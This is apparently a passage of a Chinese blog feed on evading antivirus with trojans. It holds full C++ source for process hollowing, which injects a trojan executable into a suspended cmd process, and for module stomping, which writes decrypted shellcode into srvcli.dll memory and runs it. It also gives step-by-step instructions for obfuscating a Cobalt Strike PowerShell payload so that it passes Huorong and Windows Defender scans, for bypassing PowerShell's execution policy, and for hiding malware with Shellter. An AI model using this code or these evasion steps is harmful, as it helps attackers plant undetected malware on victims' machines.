RemoteImageBase;</span><br><span class="line">    IN PVOID RemoteProcessMemory;</span><br><span class="line">    STARTUPINFOA si = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    PROCESS_INFORMATION pi = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    CONTEXT ctx;</span><br><span class="line">    ctx.ContextFlags = CONTEXT_FULL;</span><br><span class="line">    si.cb = <span class="built_in">sizeof</span>(si);</span><br><span class="line">   </span><br><span class="line">    <span class="comment">//用于替换的恶意程序</span></span><br><span class="line">    <span class="type">char</span> path[] = <span class="string">&quot;E:\\muma.exe&quot;</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 创建挂起的cmd进程</span></span><br><span class="line">    BOOL bRet = <span class="built_in">CreateProcessA</span>(</span><br><span class="line">        <span class="literal">NULL</span>,</span><br><span class="line">        (LPSTR)<span class="string">&quot;cmd&quot;</span>,</span><br><span class="line">        <span class="literal">NULL</span>,</span><br><span class="line">        <span class="literal">NULL</span>,</span><br><span class="line">        FALSE,</span><br><span class="line">        CREATE_SUSPENDED,</span><br><span class="line">        <span class="literal">NULL</span>,</span><br><span class="line">        <span class="literal">NULL</span>,</span><br><span class="line">        &amp;si,</span><br><span class="line">        &amp;pi);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//读取恶意程序的内容至本进程内存中</span></span><br><span class="line">    hFile = <span class="built_in">CreateFileA</span>(path, GENERIC_READ, FILE_SHARE_READ, <span class="literal">NULL</span>, OPEN_EXISTING, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">    dwFileSize = <span class="built_in">GetFileSize</span>(hFile, <span class="literal">NULL</span>); <span class="comment">//获取替换可执行文件的大小</span></span><br><span class="line">    FileImage = <span class="built_in">VirtualAlloc</span>(<span class="literal">NULL</span>, dwFileSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);</span><br><span class="line">    <span class="built_in">ReadFile</span>(hFile, FileImage, dwFileSize, &amp;FileReadSize, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="built_in">CloseHandle</span>(hFile);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//获取恶意程序的文件头信息(Dos头和Nt头)</span></span><br><span class="line">    pDosHeaders = (PIMAGE_DOS_HEADER)FileImage;  <span class="comment">//获取Dos头</span></span><br><span class="line">    pNtHeaders = (PIMAGE_NT_HEADERS)((LPBYTE)FileImage + pDosHeaders-&gt;e_lfanew); <span class="comment">//获取NT头</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">//获取挂起进程的上下文</span></span><br><span class="line">    <span class="built_in">GetThreadContext</span>(pi.hThread, &amp;ctx); </span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"> <span class="comment">//获取挂起进程的映像基址</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _WIN64</span></span><br><span class="line">    <span class="built_in">ReadProcessMemory</span>(pi.hProcess, (PVOID)(ctx.Rdx + (<span class="built_in">sizeof</span>(SIZE_T) * <span class="number">2</span>)), &amp;RemoteImageBase, <span class="built_in">sizeof</span>(PVOID), <span class="literal">NULL</span>);</span><br><span class="line">    <span class="comment">// 从rbx寄存器中获取PEB地址，并从PEB中读取可执行映像的基址</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    <span class="comment">// 从ebx寄存器中获取PEB地址，并从PEB中读取可执行映像的基址</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _X86_</span></span><br><span class="line">    <span class="built_in">ReadProcessMemory</span>(pi.hProcess, (PVOID)(ctx.Ebx + <span class="number">8</span>), &amp;RemoteImageBase, <span class="built_in">sizeof</span>(PVOID), <span class="literal">NULL</span>);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    <span class="comment">//判断文件预期加载地址是否被占用</span></span><br><span class="line">    pNtUnmapViewOfSection NtUnmapViewOfSection = (pNtUnmapViewOfSection)<span class="built_in">GetProcAddress</span>(<span class="built_in">GetModuleHandleA</span>(<span class="string">&quot;ntdll.dll&quot;</span>), <span class="string">&quot;NtUnmapViewOfSection&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ((SIZE_T)RemoteImageBase == pNtHeaders-&gt;OptionalHeader.ImageBase)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">NtUnmapViewOfSection</span>(pi.hProcess, RemoteImageBase); <span class="comment">//卸载已存在文件</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//为可执行映像分配内存,并写入文件头</span></span><br><span class="line">    RemoteProcessMemory = <span class="built_in">VirtualAllocEx</span>(pi.hProcess, (PVOID)pNtHeaders-&gt;OptionalHeader.ImageBase, pNtHeaders-&gt;OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);</span><br><span class="line">    <span class="built_in">WriteProcessMemory</span>(pi.hProcess, RemoteProcessMemory, FileImage, pNtHeaders-&gt;OptionalHeader.SizeOfHeaders, <span class="literal">NULL</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//逐段写入</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; pNtHeaders-&gt;FileHeader.NumberOfSections; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        pSectionHeaders = (PIMAGE_SECTION_HEADER)((LPBYTE)FileImage + pDosHeaders-&gt;e_lfanew + <span class="built_in">sizeof</span>(IMAGE_NT_HEADERS) + (i * <span class="built_in">sizeof</span>(IMAGE_SECTION_HEADER)));</span><br><span class="line">        <span class="built_in">WriteProcessMemory</span>(pi.hProcess, (PVOID)((LPBYTE)RemoteProcessMemory + pSectionHeaders-&gt;VirtualAddress), (PVOID)((LPBYTE)FileImage + pSectionHeaders-&gt;PointerToRawData), pSectionHeaders-&gt;SizeOfRawData, <span class="literal">NULL</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//将rax寄存器设置为注入软件的入口点</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _WIN64</span></span><br><span class="line">    ctx.Rcx = (SIZE_T)((LPBYTE)RemoteProcessMemory + pNtHeaders-&gt;OptionalHeader.AddressOfEntryPoint);</span><br><span class="line">    <span class="built_in">WriteProcessMemory</span>(pi.hProcess, (PVOID)(ctx.Rdx + (<span class="built_in">sizeof</span>(SIZE_T) * <span class="number">2</span>)), &amp;pNtHeaders-&gt;OptionalHeader.ImageBase, <span class="built_in">sizeof</span>(PVOID), <span class="literal">NULL</span>);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    <span class="comment">//将eax寄存器设置为注入软件的入口点</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _X86_</span></span><br><span class="line">    ctx.Eax = (SIZE_T)((LPBYTE)RemoteProcessMemory + pNtHeaders-&gt;OptionalHeader.AddressOfEntryPoint);</span><br><span class="line">    <span class="built_in">WriteProcessMemory</span>(pi.hProcess, (PVOID)(ctx.Ebx + (<span class="built_in">sizeof</span>(SIZE_T) * <span class="number">2</span>)), &amp;pNtHeaders-&gt;OptionalHeader.ImageBase, <span class="built_in">sizeof</span>(PVOID), <span class="literal">NULL</span>);</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    lea eax</span></span><br><span class="line"><span class="comment">    call eax</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    <span class="built_in">SetThreadContext</span>(pi.hThread, &amp;ctx); <span class="comment">// 设置线程上下文</span></span><br><span class="line">    <span class="built_in">ResumeThread</span>(pi.hThread); <span class="comment">// 恢复挂起线程</span></span><br><span class="line">    <span class="built_in">CloseHandle</span>(pi.hThread);</span><br><span class="line">    <span class="built_in">CloseHandle</span>(pi.hProcess);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h1 id="16-模块践踏"><a href="#16-模块践踏" class="headerlink" title="16.模块践踏"></a>16.模块践踏</h1><h2 id="简介-3"><a href="#简介-3" class="headerlink" title="简介"></a>简介</h2><p>模块践踏通常涉及到选择一个已经加载到内存中的模块，然后覆盖或替换这个模块的部分内容，通常是其.text段（代码段），以实现恶意代码的注入</p>
<h2 id="实现思路-3"><a href="#实现思路-3" class="headerlink" title="实现思路"></a>实现思路</h2><ol>
<li>在内存中加载srvcli.dll模块，并找到这个模块在内存中的地址。</li>
<li>定义了一个包含加密后shellcode的数组（encryptedShellcode）和一个密钥（key）。此shellcode是以异或加密的形式给出的。</li>
<li>创建一个新的数组（shellcode），用于存储解密后的shellcode。使用给定的密钥对加密的shellcode进行解密。</li>
<li>调用<code>NtProtectVirtualMemory</code>函数改变选定内存区域的保护属性，将其改为可读写。</li>
<li>使用<code>RtlMoveMemory</code>函数将解密后的shellcode复制到目标模块（srvcli.dll）在内存中的地址。</li>
<li>使用<code>NtProtectVirtualMemory</code>函数恢复原来的内存保护属性。</li>
<li>创建一个新线程来执行注入的shellcode。新线程的入口点设置为shellcode的内存地址。</li>
<li>调用<code>NtWaitForSingleObject</code>等待新创建的线程执行完毕。</li>
</ol>
<h2 id="完整代码-2"><a href="#完整代码-2" class="headerlink" title="完整代码"></a>完整代码</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;wincrypt.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment (lib, <span class="string">&quot;crypt32.lib&quot;</span>)</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib, <span class="string">&quot;ntdll&quot;</span>)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> NtCurrentProcess() ((HANDLE)-1)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DEFAULT_BUFLEN 4096</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> NT_SUCCESS</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> NT_SUCCESS(Status) (((NTSTATUS)(Status)) &gt;= 0)</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">WCHAR* slib = (WCHAR*)<span class="string">L&quot;C:\\Windows\\system32\\srvcli.dll&quot;</span>;</span><br><span class="line"><span class="function">EXTERN_C NTSTATUS <span class="title">NtAllocateVirtualMemory</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">	HANDLE ProcessHandle,</span></span></span><br><span class="line"><span class="params"><span class="function">	PVOID* BaseAddress,</span></span></span><br><span class="line"><span class="params"><span class="function">	ULONG_PTR ZeroBits,</span></span></span><br><span class="line"><span class="params"><span class="function">	PSIZE_T RegionSize,</span></span></span><br><span class="line"><span class="params"><span class="function">	ULONG AllocationType,</span></span></span><br><span class="line"><span class="params"><span class="function">	ULONG Protect</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br><span class="line"><span class="function">EXTERN_C NTSTATUS <span class="title">NtProtectVirtualMemory</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">	IN HANDLE ProcessHandle,</span></span></span><br><span class="line"><span class="params"><span class="function">	IN OUT PVOID* BaseAddress,</span></span></span><br><span class="line"><span class="params"><span class="function">	IN OUT PSIZE_T RegionSize,</span></span></span><br><span class="line"><span class="params"><span class="function">	IN ULONG NewProtect,</span></span></span><br><span class="line"><span class="params"><span class="function">	OUT PULONG OldProtect)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function">EXTERN_C NTSTATUS <span class="title">NtCreateThreadEx</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">	OUT PHANDLE hThread,</span></span></span><br><span class="line"><span class="params"><span class="function">	IN ACCESS_MASK DesiredAccess,</span></span></span><br><span class="line"><span class="params"><span class="function">	IN PVOID ObjectAttributes,</span></span></span><br><span class="line"><span class="params"><span class="function">	IN HANDLE ProcessHandle,</span></span></span><br><span class="line"><span class="params"><span class="function">	IN PVOID lpStartAddress,</span></span></span><br><span class="line"><span class="params"><span class="function">	IN PVOID lpParameter,</span></span></span><br><span class="line"><span class="params"><span class="function">	IN ULONG Flags,</span></span></span><br><span class="line"><span class="params"><span class="function">	IN SIZE_T StackZeroBits,</span></span></span><br><span class="line"><span class="params"><span class="function">	IN SIZE_T SizeOfStackCommit,</span></span></span><br><span class="line"><span class="params"><span class="function">	IN SIZE_T SizeOfStackReserve,</span></span></span><br><span class="line"><span class="params"><span class="function">	OUT PVOID lpBytesBuffer</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br><span class="line"><span class="function">EXTERN_C NTSTATUS <span class="title">NtWaitForSingleObject</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">	IN HANDLE Handle,</span></span></span><br><span class="line"><span class="params"><span class="function">	IN BOOLEAN Alertable,</span></span></span><br><span class="line"><span class="params"><span class="function">	IN PLARGE_INTEGER Timeout</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">DecryptAES</span><span class="params">(<span class="type">char</span>* shellcode, DWORD shellcodeLen, <span class="type">char</span>* key, DWORD keyLen)</span> </span>&#123;</span><br><span class="line">	HCRYPTPROV hProv;</span><br><span class="line">	HCRYPTHASH hHash;</span><br><span class="line">	HCRYPTKEY hKey;</span><br><span class="line">	<span class="keyword">if</span> (!<span class="built_in">CryptAcquireContextW</span>(&amp;hProv, <span class="literal">NULL</span>, <span class="literal">NULL</span>, PROV_RSA_AES,</span><br><span class="line">		CRYPT_VERIFYCONTEXT)) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;Failed in CryptAcquireContextW (%u)\n&quot;</span>, <span class="built_in">GetLastError</span>());</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (!<span class="built_in">CryptCreateHash</span>(hProv, CALG_SHA_256, <span class="number">0</span>, <span class="number">0</span>, &amp;hHash)) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;Failed in CryptCreateHash (%u)\n&quot;</span>, <span class="built_in">GetLastError</span>());</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (!<span class="built_in">CryptHashData</span>(hHash, (BYTE*)key, keyLen, <span class="number">0</span>)) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;Failed in CryptHashData (%u)\n&quot;</span>, <span class="built_in">GetLastError</span>());</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (!<span class="built_in">CryptDeriveKey</span>(hProv, CALG_AES_256, hHash, <span class="number">0</span>, &amp;hKey)) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;Failed in CryptDeriveKey (%u)\n&quot;</span>, <span class="built_in">GetLastError</span>());</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (!<span class="built_in">CryptDecrypt</span>(hKey, (HCRYPTHASH)<span class="literal">NULL</span>, <span class="number">0</span>, <span class="number">0</span>, (BYTE*)shellcode,</span><br><span class="line">		&amp;shellcodeLen)) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;Failed in CryptDecrypt (%u)\n&quot;</span>, <span class="built_in">GetLastError</span>());</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">CryptReleaseContext</span>(hProv, <span class="number">0</span>);</span><br><span class="line">	<span class="built_in">CryptDestroyHash</span>(hHash);</span><br><span class="line">	<span class="built_in">CryptDestroyKey</span>(hKey);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>** argv)</span> </span>&#123;</span><br><span class="line">	</span><br><span class="line">	<span class="comment">// 填写xor加密后的shellcode</span></span><br><span class="line">	<span class="type">char</span> encryptedShellcode[] = <span class="string">&quot;&quot;</span>;</span><br><span class="line">	</span><br><span class="line">	<span class="comment">// 定义解密所用的密钥</span></span><br><span class="line">	<span class="type">char</span> key[] = <span class="string">&quot;12henry1222345??6aa+-==@asd&quot;</span>;</span><br><span class="line"></span><br><span class="line">	DWORD payload_length = <span class="built_in">sizeof</span>(encryptedShellcode);</span><br><span class="line">	PVOID BaseAddress = <span class="literal">NULL</span>;</span><br><span class="line">	SIZE_T dwSize = <span class="number">0x2000</span>;</span><br><span class="line">	HMODULE addr;</span><br><span class="line">	addr = <span class="built_in">LoadLibrary</span>(slib);</span><br><span class="line">	BaseAddress = addr + <span class="number">0x1000</span> * <span class="number">2</span> + <span class="number">0xf</span>; <span class="comment">//2kb+f</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot; ptr：%p&quot;</span>, BaseAddress);</span><br><span class="line"></span><br><span class="line">	</span><br><span class="line">	<span class="comment">// 定义一个与加密shellcode大小相同的数组用于存储解密后的shellcode</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">char</span> shellcode[<span class="keyword">sizeof</span> encryptedShellcode];</span><br><span class="line">	<span class="comment">// 获取密钥的长度</span></span><br><span class="line">	<span class="type">int</span> keylength = <span class="built_in">strlen</span>(key);</span><br><span class="line">	<span class="comment">// 遍历加密的shellcode，并使用异或操作进行解密，将结果存储在shellcode数组中</span></span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="keyword">sizeof</span> encryptedShellcode; i++) &#123;</span><br><span class="line">		shellcode[i] = encryptedShellcode[i] ^ key[i % keylength];</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;%02X&quot;</span>, shellcode[i]);</span><br><span class="line">	&#125;</span><br><span class="line">	DWORD OldProtect = <span class="number">0</span>;</span><br><span class="line">	<span class="built_in">NtProtectVirtualMemory</span>(<span class="built_in">NtCurrentProcess</span>(), &amp;BaseAddress, (PSIZE_T)&amp;dwSize,</span><br><span class="line">		PAGE_READWRITE, &amp;OldProtect);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="built_in">RtlMoveMemory</span>(BaseAddress, shellcode, <span class="built_in">sizeof</span>(shellcode));</span><br><span class="line">	HANDLE hThread;</span><br><span class="line">	<span class="built_in">NtProtectVirtualMemory</span>(<span class="built_in">NtCurrentProcess</span>(), &amp;BaseAddress, (PSIZE_T)&amp;dwSize,</span><br><span class="line">		OldProtect, &amp;OldProtect);</span><br><span class="line">	HANDLE hHostThread = INVALID_HANDLE_VALUE;</span><br><span class="line">	NTSTATUS NtCreateThreadstatus = <span class="built_in">NtCreateThreadEx</span>(&amp;hHostThread, <span class="number">0x1FFFFF</span>,</span><br><span class="line">		<span class="literal">NULL</span>, <span class="built_in">NtCurrentProcess</span>(), (LPTHREAD_START_ROUTINE)BaseAddress, <span class="literal">NULL</span>, FALSE,</span><br><span class="line">		<span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>); </span><br><span class="line">	<span class="built_in">getchar</span>();</span><br><span class="line">	<span class="keyword">if</span> (!<span class="built_in">NT_SUCCESS</span>(NtCreateThreadstatus)) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;[!] Failed in sysNtCreateThreadEx (%u)\n&quot;</span>, <span class="built_in">GetLastError</span>());</span><br><span class="line">		<span class="keyword">return</span> <span class="number">3</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	LARGE_INTEGER Timeout;</span><br><span class="line">	Timeout.QuadPart = <span class="number">-10000000</span>;</span><br><span class="line">	NTSTATUS NTWFSOstatus = <span class="built_in">NtWaitForSingleObject</span>(hHostThread, FALSE, <span class="literal">NULL</span>);</span><br><span class="line">	<span class="keyword">if</span> (!<span class="built_in">NT_SUCCESS</span>(NTWFSOstatus)) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;[!] Failed in sysNtWaitForSingleObject (%u)\n&quot;</span>, <span class="built_in">GetLastError</span>());</span><br><span class="line">		<span class="keyword">return</span> <span class="number">4</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>









]]></content>
  </entry>
  <entry>
    <title></title>
    <url>/2024/04/29/%E6%9C%A8%E9%A9%AC%E5%85%8D%E6%9D%80%E4%B9%8B%E5%B7%A5%E5%85%B7%E7%AF%87/</url>
    <content><![CDATA[<h1 id="Invoke-Obfuscation"><a href="#Invoke-Obfuscation" class="headerlink" title="Invoke-Obfuscation"></a>Invoke-Obfuscation</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>Invoke-Obfuscation工具下载地址: <a href="https://github.com/danielbohannon/Invoke-Obfuscation">https://github.com/danielbohannon/Invoke-Obfuscation</a></p>
<p>这是一款针对<code>PowerShell</code>文件的免杀工具, 此处对CS生成的PowerShell木马进行免杀</p>
<p>Invoke-Obfuscation是一款PowerShell混淆工具，可以将PowerShell脚本加密，使得它的检测和分析变得更加困难。该工具包含多种加密方法，可以单独使用也可以结合使用，以提高混淆的效果。Invoke-Obfuscation还有多个选项可以选择，如TOKEN、AST、STRING、ENCODING、COMPRESS和LAUNCHER，可以帮助你更好地混淆脚本</p>
<h2 id="简单演示"><a href="#简单演示" class="headerlink" title="简单演示"></a>简单演示</h2><h3 id="1-CS生成ps木马"><a href="#1-CS生成ps木马" class="headerlink" title="1.CS生成ps木马"></a>1.CS生成ps木马</h3><p>打开Cobalt Strike, 点击<code>攻击&gt;生成后门-&gt;Payload Generator</code></p>
<p><img src="/%E6%9C%A8%E9%A9%AC%E5%85%8D%E6%9D%80%E4%B9%8B%E5%B7%A5%E5%85%B7%E7%AF%87/image-20230106191819966.png" alt="image-20230106191819966">			</p>
<p>选择相应的监听, 生成<code>powershell</code>木马</p>
<p><img src="/%E6%9C%A8%E9%A9%AC%E5%85%8D%E6%9D%80%E4%B9%8B%E5%B7%A5%E5%85%B7%E7%AF%87/image-20230106191957575.png" alt="image-20230106191957575">	</p>
<h3 id="2-导入模块并加载"><a href="#2-导入模块并加载" class="headerlink" title="2.导入模块并加载"></a>2.导入模块并加载</h3><p>进入<code>invoke-Obsfuscation</code>文件夹并打开powershell, 执行如下命令导入<code>Invoke-Obfuscation</code>模块</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Import-Module</span> .\<span class="built_in">Invoke-Obfuscation</span>.psd1</span><br></pre></td></tr></table></figure>



<p>执行如下命令加载模块</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Invoke-Obfuscation</span><br></pre></td></tr></table></figure>

<p><img src="/%E6%9C%A8%E9%A9%AC%E5%85%8D%E6%9D%80%E4%B9%8B%E5%B7%A5%E5%85%B7%E7%AF%87/image-20230106192850710.png" alt="image-20230106192850710"></p>
<p>随后进入工具命令行界面, 如下图所示, 该工具支持六种加密方式:</p>
<ul>
<li><p>TOKEN: 将脚本转换为一个或多个PowerShell解析器令牌的序列</p>
</li>
<li><p>AST: 将脚本转换为抽象语法树</p>
</li>
<li><p>STRING: 混淆脚本中的字符串，使得脚本的意图变得模糊不清</p>
</li>
<li><p>ENCONDING: 将脚本转换为ASCII、Unicode或Base64编码</p>
</li>
<li><p>COMPRESS: 将脚本压缩，使得脚本的大小变小，从而使得脚本的传输和存储更加方便</p>
</li>
<li><p>LAUNCHER: 生成一个启动器，该启动器可以在目标系统上执行混淆后的脚本</p>
</li>
</ul>
<img src="木马免杀之工具篇/image-20230106192908168.png" alt="image-20230106192908168" style="zoom:67%;" />	



<h3 id="3-输入要加密的脚本路径"><a href="#3-输入要加密的脚本路径" class="headerlink" title="3.输入要加密的脚本路径"></a>3.输入要加密的脚本路径</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">set scriptpath C:\Users\hacker\Desktop\payload.ps1</span><br></pre></td></tr></table></figure>

<p><img src="/%E6%9C%A8%E9%A9%AC%E5%85%8D%E6%9D%80%E4%B9%8B%E5%B7%A5%E5%85%B7%E7%AF%87/image-20230106220244166.png" alt="image-20230106220244166">	</p>
<h3 id="4-加密脚本"><a href="#4-加密脚本" class="headerlink" title="4.加密脚本"></a>4.加密脚本</h3><p>此次我选择编码加密, 输入<code>encoding</code>, 随后出现8种编码加密方式, 这里我简单介绍下常用的五种加密</p>
<ol>
<li>ASCII编码</li>
<li>HEX(16进制)编码</li>
<li>octal(8进制)编码</li>
<li>Binary(2进制)编码</li>
<li>AES算法加密(最常用)</li>
</ol>
<p><img src="/%E6%9C%A8%E9%A9%AC%E5%85%8D%E6%9D%80%E4%B9%8B%E5%B7%A5%E5%85%B7%E7%AF%87/image-20230106220433823.png" alt="image-20230106220433823">	</p>
<p>此处我选择5, 即AES算法加密</p>
<img src="木马免杀之工具篇/image-20230106221309176.png" alt="image-20230106221309176" style="zoom:67%;" />		



<p>输入<code>back</code>返回上级目录, 然后输入<code>string</code>对脚本文件进行字符串混肴, 有三种字符串混肴方法, 此处我输入2选择了第二种</p>
<p><img src="/%E6%9C%A8%E9%A9%AC%E5%85%8D%E6%9D%80%E4%B9%8B%E5%B7%A5%E5%85%B7%E7%AF%87/image-20230106222848097.png" alt="image-20230106222848097">	</p>
<h3 id="5-查看加密选项"><a href="#5-查看加密选项" class="headerlink" title="5.查看加密选项"></a>5.查看加密选项</h3><p>可以看到加密前和加密后的脚本内容对比, 以及采用了何种加密方法和完整的加密命令</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">show options</span><br></pre></td></tr></table></figure>

<p><img src="/%E6%9C%A8%E9%A9%AC%E5%85%8D%E6%9D%80%E4%B9%8B%E5%B7%A5%E5%85%B7%E7%AF%87/image-20230106223901101.png" alt="image-20230106223901101">	</p>
<h3 id="6-输出脚本"><a href="#6-输出脚本" class="headerlink" title="6.输出脚本"></a>6.输出脚本</h3><p>输出加密后的脚本文件至工具目录</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">out test.ps1</span><br></pre></td></tr></table></figure>

<p><img src="/%E6%9C%A8%E9%A9%AC%E5%85%8D%E6%9D%80%E4%B9%8B%E5%B7%A5%E5%85%B7%E7%AF%87/image-20230106221539461.png" alt="image-20230106221539461"></p>
<h2 id="杀软测试"><a href="#杀软测试" class="headerlink" title="杀软测试"></a>杀软测试</h2><h3 id="火绒"><a href="#火绒" class="headerlink" title="火绒"></a>火绒</h3><p>使用火绒静态扫描脚本文件, 没有发现威胁</p>
<p><img src="/%E6%9C%A8%E9%A9%AC%E5%85%8D%E6%9D%80%E4%B9%8B%E5%B7%A5%E5%85%B7%E7%AF%87/image-20230106223945754.png" alt="image-20230106223945754">	</p>
<p>cmd命令行输入如下命令执行脚本, 火绒没有报毒, 成功过掉火绒动态扫描</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PowerShell.exe -ExecutionPolicy Bypass -File .\test.ps1</span><br></pre></td></tr></table></figure>

<blockquote>
<p>至于为何要加上<code>-ExecutionPolicy Bypass</code>参数, 这是因为在默认情况下, powershell的安全策略规定不允许运行命令和文件, 但是可以通过添加此参数来绕过任意一个安全保护规则, 在真实的渗透环境中经常用到此参数来执行powershell脚本</p>
</blockquote>
<p><img src="/%E6%9C%A8%E9%A9%AC%E5%85%8D%E6%9D%80%E4%B9%8B%E5%B7%A5%E5%85%B7%E7%AF%87/image-20230106224136701.png" alt="image-20230106224136701">	</p>
<h3 id="WindowDefender"><a href="#WindowDefender" class="headerlink" title="WindowDefender"></a>WindowDefender</h3><p>成功过掉WindowDefender的静态扫描</p>
<p><img src="/%E6%9C%A8%E9%A9%AC%E5%85%8D%E6%9D%80%E4%B9%8B%E5%B7%A5%E5%85%B7%E7%AF%87/image-20230106224957853.png" alt="image-20230106224957853">	</p>
<p>但是过不了WindowDefender的动态扫描</p>
<p><img src="/%E6%9C%A8%E9%A9%AC%E5%85%8D%E6%9D%80%E4%B9%8B%E5%B7%A5%E5%85%B7%E7%AF%87/image-20230106225055133.png" alt="image-20230106225055133">	</p>
<h1 id="shellter"><a href="#shellter" class="headerlink" title="shellter"></a>shellter</h1><h2 id="简介-1"><a href="#简介-1" class="headerlink" title="简介"></a>简介</h2><p>Shellter是一种动态二进制程序壳程序，它可以在现有的可执行文件中隐藏恶意软件。它使用动态链接库技术来实现恶意代码的注入，并且可以在不修改现有的可执行文件的情况下进行注入。这使得它非常难以检测，因为它不会改变文件的哈希值或数字签名</p>
<p>Shellter的官方下载地址：<a href="https://www.shellterproject.com/">https://www.shellterproject.com/</a></p>
<p>当前Shellter最新免费版本是v7.2，最新收费版本是v_pro4.7</p>
<h2 id="简单实例"><a href="#简单实例" class="headerlink" title="简单实例"></a>简单实例</h2><h3 id="1-选择模式"><a href="#1-选择模式" class="headerlink" title="1.选择模式"></a>1.选择模式</h3><p>点击shellter.exe运行工具进入命令行界面, 随后选择模式, 这里我输入A, 即选择自动模式</p>
